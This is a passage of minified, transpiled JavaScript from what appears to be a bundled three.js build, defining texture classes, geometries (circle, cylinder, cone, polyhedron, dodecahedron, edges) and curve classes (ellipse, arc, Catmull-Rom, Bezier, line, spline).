Qo=function(e){_inherits2(n,pe);var t=_createSuper(n);function n(e,r,i,a,o,s,l,c,u,d,p,h){var f;return _classCallCheck2(this,n),(f=t.call(this,null,s,l,c,u,d,a,o,p,h)).image={width:r,height:i},f.mipmaps=e,f.flipY=!1,f.generateMipmaps=!1,f}return n}();Qo.prototype.isCompressedTexture=!0;var Go=function(e){_inherits2(n,pe);var t=_createSuper(n);function n(e,r,i,a,o,s,l,c,u){var d;return _classCallCheck2(this,n),(d=t.call(this,e,r,i,a,o,s,l,c,u)).needsUpdate=!0,d}return n}();Go.prototype.isCanvasTexture=!0;var Wo=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:8,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:2*Math.PI;_classCallCheck2(this,n),(e=t.call(this)).type="CircleGeometry",e.parameters={radius:r,segments:i,thetaStart:a,thetaLength:o},i=Math.max(3,i);var s=[],l=[],c=[],u=[],d=new ye,p=new re;l.push(0,0,0),c.push(0,0,1),u.push(.5,.5);for(var h=0,f=3;h<=i;h++,f+=3){var A=a+h/i*o;d.x=r*Math.cos(A),d.y=r*Math.sin(A),l.push(d.x,d.y,d.z),c.push(0,0,1),p.x=(l[f]/r+1)/2,p.y=(l[f+1]/r+1)/2,u.push(p.x,p.y)}for(var m=1;m<=i;m++)s.push(m,m+1,0);return e.setIndex(s),e.setAttribute("position",new en(l,3)),e.setAttribute("normal",new en(c,3)),e.setAttribute("uv",new en(u,2)),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radius,e.segments,e.thetaStart,e.thetaLength)}}]),n}(),Ko=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:8,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:1,l=5<arguments.length&&void 0!==arguments[5]&&arguments[5],c=6<arguments.length&&void 0!==arguments[6]?arguments[6]:0,u=7<arguments.length&&void 0!==arguments[7]?arguments[7]:2*Math.PI;_classCallCheck2(this,n),(e=t.call(this)).type="CylinderGeometry",e.parameters={radiusTop:r,radiusBottom:i,height:a,radialSegments:o,heightSegments:s,openEnded:l,thetaStart:c,thetaLength:u};var d=_assertThisInitialized2(e);o=Math.floor(o),s=Math.floor(s);var p=[],h=[],f=[],A=[],m=0,v=[],g=a/2,y=0;function b(e){for(var t=m,n=new re,a=new ye,s=0,l=!0===e?r:i,v=!0===e?1:-1,b=1;b<=o;b++)h.push(0,g*v,0),f.push(0,v,0),A.push(.5,.5),m++;for(var _=m,w=0;w<=o;w++){var C=w/o*u+c,x=Math.cos(C),S=Math.sin(C);a.x=l*S,a.y=g*v,a.z=l*x,h.push(a.x,a.y,a.z),f.push(0,v,0),n.x=.5*x+.5,n.y=.5*S*v+.5,A.push(n.x,n.y),m++}for(var k=0;k<o;k++){var M=t+k,B=_+k;!0===e?p.push(B,B+1,M):p.push(B+1,B,M),s+=3}d.addGroup(y,s,!0===e?1:2),y+=s}return function(){for(var e=new ye,t=new ye,n=0,l=(i-r)/a,b=0;b<=s;b++){for(var _=[],w=b/s,C=w*(i-r)+r,x=0;x<=o;x++){var S=x/o,k=S*u+c,M=Math.sin(k),B=Math.cos(k);t.x=C*M,t.y=-w*a+g,t.z=C*B,h.push(t.x,t.y,t.z),e.set(M,l,B).normalize(),f.push(e.x,e.y,e.z),A.push(S,1-w),_.push(m++)}v.push(_)}for(var E=0;E<o;E++)for(var T=0;T<s;T++){var P=v[T][E],I=v[T+1][E],F=v[T+1][E+1],L=v[T][E+1];p.push(P,I,L),p.push(I,F,L),n+=6}d.addGroup(y,n,0),y+=n}(),!1===l&&(0<r&&b(!0),0<i&&b(!1)),e.setIndex(p),e.setAttribute("position",new en(h,3)),e.setAttribute("normal",new en(f,3)),e.setAttribute("uv",new en(A,2)),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radiusTop,e.radiusBottom,e.height,e.radialSegments,e.heightSegments,e.openEnded,e.thetaStart,e.thetaLength)}}]),n}(),qo=function(e){_inherits2(n,Ko);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:8,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1,s=4<arguments.length&&void 0!==arguments[4]&&arguments[4],l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:0,c=6<arguments.length&&void 0!==arguments[6]?arguments[6]:2*Math.PI;return _classCallCheck2(this,n),(e=t.call(this,0,r,i,a,o,s,l,c)).type="ConeGeometry",e.parameters={radius:r,height:i,radialSegments:a,heightSegments:o,openEnded:s,thetaStart:l,thetaLength:c},e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radius,e.height,e.radialSegments,e.heightSegments,e.openEnded,e.thetaStart,e.thetaLength)}}]),n}(),Xo=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:[],a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:0;_classCallCheck2(this,n),(e=t.call(this)).type="PolyhedronGeometry",e.parameters={vertices:r,indices:i,radius:a,detail:o};var s=[],l=[];function c(e,t,n,r){for(var i=r+1,a=[],o=0;o<=i;o++){a[o]=[];for(var s=e.clone().lerp(n,o/i),l=t.clone().lerp(n,o/i),c=i-o,d=0;d<=c;d++)a[o][d]=0===d&&o===i?s:s.clone().lerp(l,d/c)}for(var p=0;p<i;p++)for(var h=0;h<2*(i-p)-1;h++){var f=Math.floor(h/2);h%2==0?(u(a[p][f+1]),u(a[p+1][f]),u(a[p][f])):(u(a[p][f+1]),u(a[p+1][f+1]),u(a[p+1][f]))}}function u(e){s.push(e.x,e.y,e.z)}function d(e,t){var n=3*e;t.x=r[n+0],t.y=r[n+1],t.z=r[n+2]}function p(e,t,n,r){r<0&&1===e.x&&(l[t]=e.x-1),0===n.x&&0===n.z&&(l[t]=r/2/Math.PI+.5)}function h(e){return Math.atan2(e.z,-e.x)}return function(e){for(var t=new ye,n=new ye,r=new ye,a=0;a<i.length;a+=3)d(i[a+0],t),d(i[a+1],n),d(i[a+2],r),c(t,n,r,e)}(o),function(e){for(var t=new ye,n=0;n<s.length;n+=3)t.x=s[n+0],t.y=s[n+1],t.z=s[n+2],t.normalize().multiplyScalar(e),s[n+0]=t.x,s[n+1]=t.y,s[n+2]=t.z}(a),function(){for(var e=new ye,t=0;t<s.length;t+=3){e.x=s[t+0],e.y=s[t+1],e.z=s[t+2];var n=h(e)/2/Math.PI+.5,r=(i=e,Math.atan2(-i.y,Math.sqrt(i.x*i.x+i.z*i.z))/Math.PI+.5);l.push(n,1-r)}var i;(function(){for(var e=new ye,t=new ye,n=new ye,r=new ye,i=new re,a=new re,o=new re,c=0,u=0;c<s.length;c+=9,u+=6){e.set(s[c+0],s[c+1],s[c+2]),t.set(s[c+3],s[c+4],s[c+5]),n.set(s[c+6],s[c+7],s[c+8]),i.set(l[u+0],l[u+1]),a.set(l[u+2],l[u+3]),o.set(l[u+4],l[u+5]),r.copy(e).add(t).add(n).divideScalar(3);var d=h(r);p(i,u+0,e,d),p(a,u+2,t,d),p(o,u+4,n,d)}})(),function(){for(var e=0;e<l.length;e+=6){var t=l[e+0],n=l[e+2],r=l[e+4],i=Math.max(t,n,r),a=Math.min(t,n,r);.9<i&&a<.1&&(t<.2&&(l[e+0]+=1),n<.2&&(l[e+2]+=1),r<.2&&(l[e+4]+=1))}}()}(),e.setAttribute("position",new en(s,3)),e.setAttribute("normal",new en(s.slice(),3)),e.setAttribute("uv",new en(l,2)),0===o?e.computeVertexNormals():e.normalizeNormals(),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.vertices,e.indices,e.radius,e.details)}}]),n}(),Yo=function(e){_inherits2(n,Xo);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;_classCallCheck2(this,n);var a=(1+Math.sqrt(5))/2,o=1/a,s=[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-o,-a,0,-o,a,0,o,-a,0,o,a,-o,-a,0,-o,a,0,o,-a,0,o,a,0,-a,0,-o,a,0,-o,-a,0,o,a,0,o];return(e=t.call(this,s,[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,12,14,1,14,5,1,5,9],r,i)).type="DodecahedronGeometry",e.parameters={radius:r,detail:i},e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radius,e.detail)}}]),n}(),Jo=new ye,Zo=new ye,es=new ye,ts=new It,ns=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:null,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1;if(_classCallCheck2(this,n),(e=t.call(this)).type="EdgesGeometry",e.parameters={geometry:r,thresholdAngle:i},null!==r){for(var a=Math.pow(10,4),o=Math.cos(W*i),s=r.getIndex(),l=r.getAttribute("position"),c=s?s.count:l.count,u=[0,0,0],d=["a","b","c"],p=new Array(3),h={},f=[],A=0;A<c;A+=3){u[2]=s?(u[0]=s.getX(A),u[1]=s.getX(A+1),s.getX(A+2)):(u[0]=A,u[1]=A+1,A+2);var m=ts.a,v=ts.b,g=ts.c;if(m.fromBufferAttribute(l,u[0]),v.fromBufferAttribute(l,u[1]),g.fromBufferAttribute(l,u[2]),ts.getNormal(es),p[0]="".concat(Math.round(m.x*a),",").concat(Math.round(m.y*a),",").concat(Math.round(m.z*a)),p[1]="".concat(Math.round(v.x*a),",").concat(Math.round(v.y*a),",").concat(Math.round(v.z*a)),p[2]="".concat(Math.round(g.x*a),",").concat(Math.round(g.y*a),",").concat(Math.round(g.z*a)),p[0]!==p[1]&&p[1]!==p[2]&&p[2]!==p[0])for(var y=0;y<3;y++){var b=(y+1)%3,_=p[y],w=p[b],C=ts[d[y]],x=ts[d[b]],S="".concat(_,"_").concat(w),k="".concat(w,"_").concat(_);k in h&&h[k]?(es.dot(h[k].normal)<=o&&(f.push(C.x,C.y,C.z),f.push(x.x,x.y,x.z)),h[k]=null):S in h||(h[S]={index0:u[y],index1:u[b],normal:es.clone()})}}for(var M in h)if(h[M]){var B=h[M],E=B.index0,T=B.index1;Jo.fromBufferAttribute(l,E),Zo.fromBufferAttribute(l,T),f.push(Jo.x,Jo.y,Jo.z),f.push(Zo.x,Zo.y,Zo.z)}e.setAttribute("position",new en(f,3))}return e}return n}(),rs=function(){function e(){_classCallCheck2(this,e),this.type="Curve",this.arcLengthDivisions=200}return _createClass2(e,[{key:"getPoint",value:function(){return null}},{key:"getPointAt",value:function(e,t){var n=this.getUtoTmapping(e);return this.getPoint(n,t)}},{key:"getPoints",value:function(){for(var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:5,t=[],n=0;n<=e;n++)t.push(this.getPoint(n/e));return t}},{key:"getSpacedPoints",value:function(){for(var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:5,t=[],n=0;n<=e;n++)t.push(this.getPointAt(n/e));return t}},{key:"getLength",value:function(){var e=this.getLengths();return e[e.length-1]}},{key:"getLengths",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:this.arcLengthDivisions;if(this.cacheArcLengths&&this.cacheArcLengths.length===e+1&&!this.needsUpdate)return this.cacheArcLengths;this.needsUpdate=!1;var t,n=[],r=this.getPoint(0),i=0;n.push(0);for(var a=1;a<=e;a++)i+=(t=this.getPoint(a/e)).distanceTo(r),n.push(i),r=t;return this.cacheArcLengths=n}},{key:"updateArcLengths",value:function(){this.needsUpdate=!0,this.getLengths()}},{key:"getUtoTmapping",value:function(e,t){var n,r=this.getLengths(),i=0,a=r.length;n=t||e*r[a-1];for(var o,s=0,l=a-1;s<=l;)if((o=r[i=Math.floor(s+(l-s)/2)]-n)<0)s=i+1;else{if(!(0<o)){l=i;break}l=i-1}if(r[i=l]===n)return i/(a-1);var c=r[i];return(i+(n-c)/(r[i+1]-c))/(a-1)}},{key:"getTangent",value:function(e,t){var n=e-1e-4,r=e+1e-4;n<0&&(n=0),1<r&&(r=1);var i=this.getPoint(n),a=this.getPoint(r),o=t||(i.isVector2?new re:new ye);return o.copy(a).sub(i).normalize(),o}},{key:"getTangentAt",value:function(e,t){var n=this.getUtoTmapping(e);return this.getTangent(n,t)}},{key:"computeFrenetFrames",value:function(e,t){for(var n=new ye,r=[],i=[],a=[],o=new ye,s=new Xe,l=0;l<=e;l++){var c=l/e;r[l]=this.getTangentAt(c,new ye)}i[0]=new ye,a[0]=new ye;var u=Number.MAX_VALUE,d=Math.abs(r[0].x),p=Math.abs(r[0].y),h=Math.abs(r[0].z);d<=u&&(u=d,n.set(1,0,0)),p<=u&&(u=p,n.set(0,1,0)),h<=u&&n.set(0,0,1),o.crossVectors(r[0],n).normalize(),i[0].crossVectors(r[0],o),a[0].crossVectors(r[0],i[0]);for(var f=1;f<=e;f++){if(i[f]=i[f-1].clone(),a[f]=a[f-1].clone(),o.crossVectors(r[f-1],r[f]),o.length()>Number.EPSILON){o.normalize();var A=Math.acos(X(r[f-1].dot(r[f]),-1,1));i[f].applyMatrix4(s.makeRotationAxis(o,A))}a[f].crossVectors(r[f],i[f])}if(!0===t){var m=Math.acos(X(i[0].dot(i[e]),-1,1));m/=e,0<r[0].dot(o.crossVectors(i[0],i[e]))&&(m=-m);for(var v=1;v<=e;v++)i[v].applyMatrix4(s.makeRotationAxis(r[v],m*v)),a[v].crossVectors(r[v],i[v])}return{tangents:r,normals:i,binormals:a}}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"copy",value:function(e){return this.arcLengthDivisions=e.arcLengthDivisions,this}},{key:"toJSON",value:function(){var e={metadata:{version:4.5,type:"Curve",generator:"Curve.toJSON"}};return e.arcLengthDivisions=this.arcLengthDivisions,e.type=this.type,e}},{key:"fromJSON",value:function(e){return this.arcLengthDivisions=e.arcLengthDivisions,this}}]),e}(),is=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:0,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:0,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:2*Math.PI,c=6<arguments.length&&void 0!==arguments[6]&&arguments[6],u=7<arguments.length&&void 0!==arguments[7]?arguments[7]:0;return _classCallCheck2(this,n),(e=t.call(this)).type="EllipseCurve",e.aX=r,e.aY=i,e.xRadius=a,e.yRadius=o,e.aStartAngle=s,e.aEndAngle=l,e.aClockwise=c,e.aRotation=u,e}return _createClass2(n,[{key:"getPoint",value:function(e,t){for(var n=t||new re,r=2*Math.PI,i=this.aEndAngle-this.aStartAngle,a=Math.abs(i)<Number.EPSILON;i<0;)i+=r;for(;r<i;)i-=r;i<Number.EPSILON&&(i=a?0:r),!0!==this.aClockwise||a||(i===r?i=-r:i-=r);var o=this.aStartAngle+e*i,s=this.aX+this.xRadius*Math.cos(o),l=this.aY+this.yRadius*Math.sin(o);if(0!==this.aRotation){var c=Math.cos(this.aRotation),u=Math.sin(this.aRotation),d=s-this.aX,p=l-this.aY;s=d*c-p*u+this.aX,l=d*u+p*c+this.aY}return n.set(s,l)}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.aX=e.aX,this.aY=e.aY,this.xRadius=e.xRadius,this.yRadius=e.yRadius,this.aStartAngle=e.aStartAngle,this.aEndAngle=e.aEndAngle,this.aClockwise=e.aClockwise,this.aRotation=e.aRotation,this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.aX=this.aX,e.aY=this.aY,e.xRadius=this.xRadius,e.yRadius=this.yRadius,e.aStartAngle=this.aStartAngle,e.aEndAngle=this.aEndAngle,e.aClockwise=this.aClockwise,e.aRotation=this.aRotation,e}},{key:"fromJSON",value:function(e){return _get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.aX=e.aX,this.aY=e.aY,this.xRadius=e.xRadius,this.yRadius=e.yRadius,this.aStartAngle=e.aStartAngle,this.aEndAngle=e.aEndAngle,this.aClockwise=e.aClockwise,this.aRotation=e.aRotation,this}}]),n}();is.prototype.isEllipseCurve=!0;var as=function(e){_inherits2(n,is);var t=_createSuper(n);function n(e,r,i,a,o,s){var l;return _classCallCheck2(this,n),(l=t.call(this,e,r,i,i,a,o,s)).type="ArcCurve",l}return n}();function os(){var e=0,t=0,n=0,r=0;function i(i,a,o,s){n=-3*(e=i)+3*a-2*(t=o)-s,r=2*i-2*a+o+s}return{initCatmullRom:function(e,t,n,r,a){i(t,n,a*(n-e),a*(r-t))},initNonuniformCatmullRom:function(e,t,n,r,a,o,s){var l=(t-e)/a-(n-e)/(a+o)+(n-t)/o,c=(n-t)/o-(r-t)/(o+s)+(r-n)/s;i(t,n,l*=o,c*=o)},calc:function(i){var a=i*i;return e+t*i+n*a+r*(a*i)}}}as.prototype.isArcCurve=!0;var ss=new ye,ls=new os,cs=new os,us=new os,ds=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],i=1<arguments.length&&void 0!==arguments[1]&&arguments[1],a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:"centripetal",o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:.5;return _classCallCheck2(this,n),(e=t.call(this)).type="CatmullRomCurve3",e.points=r,e.closed=i,e.curveType=a,e.tension=o,e}return _createClass2(n,[{key:"getPoint",value:function(e){var t,n,r=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye,i=this.points,a=i.length,o=(a-(this.closed?0:1))*e,s=Math.floor(o),l=o-s;this.closed?s+=0<s?0:(Math.floor(Math.abs(s)/a)+1)*a:0===l&&s===a-1&&(s=a-2,l=1),t=this.closed||0<s?i[(s-1)%a]:(ss.subVectors(i[0],i[1]).add(i[0]),ss);var c=i[s%a],u=i[(s+1)%a];if(n=this.closed||s+2<a?i[(s+2)%a]:(ss.subVectors(i[a-1],i[a-2]).add(i[a-1]),ss),"centripetal"===this.curveType||"chordal"===this.curveType){var d="chordal"===this.curveType?.5:.25,p=Math.pow(t.distanceToSquared(c),d),h=Math.pow(c.distanceToSquared(u),d),f=Math.pow(u.distanceToSquared(n),d);h<1e-4&&(h=1),p<1e-4&&(p=h),f<1e-4&&(f=h),ls.initNonuniformCatmullRom(t.x,c.x,u.x,n.x,p,h,f),cs.initNonuniformCatmullRom(t.y,c.y,u.y,n.y,p,h,f),us.initNonuniformCatmullRom(t.z,c.z,u.z,n.z,p,h,f)}else"catmullrom"===this.curveType&&(ls.initCatmullRom(t.x,c.x,u.x,n.x,this.tension),cs.initCatmullRom(t.y,c.y,u.y,n.y,this.tension),us.initCatmullRom(t.z,c.z,u.z,n.z,this.tension));return r.set(ls.calc(l),cs.calc(l),us.calc(l)),r}},{key:"copy",value:function(e){_get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.points=[];for(var t=0,r=e.points.length;t<r;t++){var i=e.points[t];this.points.push(i.clone())}return this.closed=e.closed,this.curveType=e.curveType,this.tension=e.tension,this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);e.points=[];for(var t=0,r=this.points.length;t<r;t++){var i=this.points[t];e.points.push(i.toArray())}return e.closed=this.closed,e.curveType=this.curveType,e.tension=this.tension,e}},{key:"fromJSON",value:function(e){_get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.points=[];for(var t=0,r=e.points.length;t<r;t++){var i=e.points[t];this.points.push((new ye).fromArray(i))}return this.closed=e.closed,this.curveType=e.curveType,this.tension=e.tension,this}}]),n}();function ps(e,t,n,r,i){var a=.5*(r-t),o=.5*(i-n),s=e*e;return(2*n-2*r+a+o)*(e*s)+(-3*n+3*r-2*a-o)*s+a*e+n}function hs(e,t,n,r){return(o=1-e)*o*t+2*(1-(a=e))*a*n+(i=e)*i*r;var i,a,o}function fs(e,t,n,r,i){return(c=1-e)*c*c*t+3*(l=1-(s=e))*l*s*n+3*(1-(o=e))*o*o*r+(a=e)*a*a*i;var a,o,s,l,c}ds.prototype.isCatmullRomCurve3=!0;var As=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new re,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new re,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:new re,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:new re;return _classCallCheck2(this,n),(e=t.call(this)).type="CubicBezierCurve",e.v0=r,e.v1=i,e.v2=a,e.v3=o,e}return _createClass2(n,[{key:"getPoint",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new re,n=this.v0,r=this.v1,i=this.v2,a=this.v3;return t.set(fs(e,n.x,r.x,i.x,a.x),fs(e,n.y,r.y,i.y,a.y)),t}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this.v3.copy(e.v3),this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e.v3=this.v3.toArray(),e}},{key:"fromJSON",value:function(e){return _get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this.v3.fromArray(e.v3),this}}]),n}();As.prototype.isCubicBezierCurve=!0;var ms=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:new ye,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:new ye;return _classCallCheck2(this,n),(e=t.call(this)).type="CubicBezierCurve3",e.v0=r,e.v1=i,e.v2=a,e.v3=o,e}return _createClass2(n,[{key:"getPoint",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye,n=this.v0,r=this.v1,i=this.v2,a=this.v3;return t.set(fs(e,n.x,r.x,i.x,a.x),fs(e,n.y,r.y,i.y,a.y),fs(e,n.z,r.z,i.z,a.z)),t}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this.v3.copy(e.v3),this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e.v3=this.v3.toArray(),e}},{key:"fromJSON",value:function(e){return _get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this.v3.fromArray(e.v3),this}}]),n}();ms.prototype.isCubicBezierCurve3=!0;var vs=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new re,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new re;return _classCallCheck2(this,n),(e=t.call(this)).type="LineCurve",e.v1=r,e.v2=i,e}return _createClass2(n,[{key:"getPoint",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new re;return 1===e?t.copy(this.v2):(t.copy(this.v2).sub(this.v1),t.multiplyScalar(e).add(this.v1)),t}},{key:"getPointAt",value:function(e,t){return this.getPoint(e,t)}},{key:"getTangent",value:function(e,t){var n=t||new re;return n.copy(this.v2).sub(this.v1).normalize(),n}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.v1.copy(e.v1),this.v2.copy(e.v2),this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e}},{key:"fromJSON",value:function(e){return _get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this}}]),n}();vs.prototype.isLineCurve=!0;var gs=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye;return _classCallCheck2(this,n),(e=t.call(this)).type="LineCurve3",e.isLineCurve3=!0,e.v1=r,e.v2=i,e}return _createClass2(n,[{key:"getPoint",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye;return 1===e?t.copy(this.v2):(t.copy(this.v2).sub(this.v1),t.multiplyScalar(e).add(this.v1)),t}},{key:"getPointAt",value:function(e,t){return this.getPoint(e,t)}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.v1.copy(e.v1),this.v2.copy(e.v2),this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e}},{key:"fromJSON",value:function(e){return _get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this}}]),n}(),ys=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new re,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new re,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:new re;return _classCallCheck2(this,n),(e=t.call(this)).type="QuadraticBezierCurve",e.v0=r,e.v1=i,e.v2=a,e}return _createClass2(n,[{key:"getPoint",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new re,n=this.v0,r=this.v1,i=this.v2;return t.set(hs(e,n.x,r.x,i.x),hs(e,n.y,r.y,i.y)),t}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e}},{key:"fromJSON",value:function(e){return _get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this}}]),n}();ys.prototype.isQuadraticBezierCurve=!0;var bs=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:new ye;return _classCallCheck2(this,n),(e=t.call(this)).type="QuadraticBezierCurve3",e.v0=r,e.v1=i,e.v2=a,e}return _createClass2(n,[{key:"getPoint",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye,n=this.v0,r=this.v1,i=this.v2;return t.set(hs(e,n.x,r.x,i.x),hs(e,n.y,r.y,i.y),hs(e,n.z,r.z,i.z)),t}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this}},{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e}},{key:"fromJSON",value:function(e){return _get2(_getPrototypeOf(n.prototype),"fromJSON",this).call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this}}]),n}();bs.prototype.isQuadraticBezierCurve3=!0;var _s=function(e){_inherits2(n,rs);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[];return _classCallCheck2(this,n),(e=t.call(this)).type="SplineCurve",e.points=r,e}return _createClass2(n,[{key:"getPoint",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new 